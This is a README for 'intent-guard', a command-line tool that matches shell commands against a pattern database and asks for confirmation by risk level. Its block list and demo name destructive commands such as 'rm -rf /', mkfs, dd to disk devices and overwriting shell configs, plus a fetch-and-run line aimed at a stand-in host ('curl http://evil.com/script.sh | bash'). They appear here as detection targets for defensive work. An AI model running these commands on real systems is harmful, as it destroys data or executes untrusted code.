# intent-guard v1.0.0

🛡️ **Command Safety Guard** - Prevent dangerous commands with risk-based confirmations.

## Philosophy

> "Manual control doesn't mean unsafe control."

Faelight Forest embraces **Manual Control Over Automation**, but that doesn't mean accepting unnecessary risk. `intent-guard` provides **safety guardrails without surveillance** - catching dangerous commands before they execute, while still giving you final authority.

## How It Works

`intent-guard` analyzes commands against a pattern database before execution:

1. **Pattern matching** - Checks command against 11 safety patterns
2. **Risk assessment** - Categorizes as LOW/MEDIUM/HIGH/CRITICAL
3. **Smart confirmation** - Requires appropriate confirmation based on risk
4. **User authority** - You always have final say

## Risk Levels

### CRITICAL (Type "DELETE" to confirm)
- `rm -rf /` - Recursive delete on critical paths
- `rm -rf ~/0-core` - Delete 0-Core system
- `mkfs.*` - Format filesystem (DESTRUCTIVE)
- `mv ~/0-core` - Move 0-Core system
- `> ~/.zshrc` - Overwrite shell configuration

### HIGH (Type y/n to confirm)
- `chmod 777` - World-writable permissions
- `dd if=/dev/... of=/dev/...` - Direct disk write
- `curl ... | bash` - Download and execute script
- `find ... -delete` - Find with delete flag

### MEDIUM (Type y/n to confirm)
- `pacman -R` - Remove system packages
- `systemctl disable/stop` - Disable/stop system service

## Usage

### Test Commands (No Execution)
```bash
# Test if command would be caught
intent-guard test "rm -rf /"
# ⚠️  Dangerous command detected:
#   CRITICAL rm_rf_dangerous - Recursive delete on critical paths

intent-guard test "chmod 777 file.txt"
# ⚠️  Dangerous command detected:
#   HIGH     chmod_777 - World-writable permissions

intent-guard test "ls -la"
# ✅ Safe command - no patterns matched
```

### List All Patterns
```bash
intent-guard list-patterns
# Shows all 11 safety patterns grouped by risk level
```

### Health Check
```bash
intent-guard --health
# 🏥 intent-guard v1.0.0 - Health Check
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   Checking pattern database... ✅ 11 patterns loaded
#   Validating pattern functions... ✅
#   Risk level distribution... ✅
#      Critical: 5
#      High:     4
#      Medium:   2
#      Low:      0
# ✅ All systems operational
```

### Shell Integration (Advanced)
```bash
# In your shell config (not enabled by default):
# preexec() { intent-guard check-command "$1" || return 1 }
```

## Pattern Database

### CRITICAL Patterns (5)
1. **rm_rf_dangerous** - Catches `rm -rf /`, `rm -rf ~`, `rm -rf /*`
2. **rm_rf_core** - Catches `rm -rf ~/0-core`
3. **mkfs** - Catches filesystem formatting
4. **mv_core** - Catches moving 0-core directory
5. **shell_overwrite** - Catches `> ~/.zshrc`, `> ~/.bashrc`

### HIGH Patterns (4)
6. **chmod_777** - World-writable permissions
7. **dd_device** - Direct disk operations
8. **piped_execution** - `curl | bash` style attacks
9. **find_delete** - Dangerous find operations

### MEDIUM Patterns (2)
10. **pacman_remove** - Package removal
11. **systemctl_disable** - Service management

## Integration with Intent Ledger

`intent-guard` complements the Intent Ledger philosophy:

- **intent** - Document *why* you're making changes
- **intent-guard** - Prevent *dangerous* changes by accident

Together they embody: **Intentionality + Safety**

## Demo for Linus
```bash
# Show pattern database
intent-guard list-patterns

# Test dangerous commands
intent-guard test "rm -rf /"
intent-guard test "chmod 777 file.txt"
intent-guard test "curl http://evil.com/script.sh | bash"

# Show system health
intent-guard --health
```

## Why This Matters

Traditional safety comes from either:
1. **Automation** - System decides for you (infantilizing)
2. **Nothing** - YOLO mode (reckless)

Faelight Forest offers a third way: **Informed Manual Control**

You stay in control, but the system catches obvious mistakes before they become disasters. It's like having a copilot who warns you, but never takes the stick.
